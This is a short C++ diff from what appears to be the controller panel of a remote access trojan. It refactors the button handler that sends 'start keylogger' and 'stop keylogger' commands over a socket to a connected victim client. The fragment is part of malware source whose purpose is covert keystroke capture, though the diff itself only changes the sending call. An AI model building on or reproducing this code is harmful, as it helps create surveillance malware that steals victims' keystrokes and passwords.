@@ -78,15 +78,11 @@ void panelKeylogger::OnToggle(wxCommandEvent& event) {
 	std::string strComando = "";
 	if (isSel) {
 		//Iniciar keylogger
-		strComando = std::to_string(EnumComandos::KL_Iniciar);
-		strComando.append(1, CMD_DEL);
-		p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Iniciar);
 		this->btn_Iniciar->SetLabelText(wxT("Detener"));
 	}else {
 		//Apagar keylogger
-		strComando = std::to_string(EnumComandos::KL_Detener);
-		strComando.append(1, CMD_DEL);
-		p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Detener);
 		this->btn_Iniciar->SetLabelText(wxT("Iniciar"));
 	}
 }
